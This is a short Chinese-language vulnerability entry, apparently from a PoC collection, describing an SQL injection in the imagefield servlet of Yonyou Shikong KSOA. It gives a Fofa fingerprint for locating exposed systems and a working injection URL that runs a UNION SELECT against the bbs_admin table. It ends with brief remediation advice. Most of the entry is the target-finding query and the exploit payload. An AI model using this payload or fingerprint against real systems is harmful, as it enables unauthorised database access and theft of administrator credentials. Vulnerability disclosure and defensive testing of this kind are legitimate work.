# 用友时空KSOAimagefield接口存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-时空KSOA"`

**Payload**
```
1. Fofa
app="用友-时空KSOA"
1. 部分界面如下
1. POC
/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27md5%27,%271%27))--+
```
- **其他**：修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。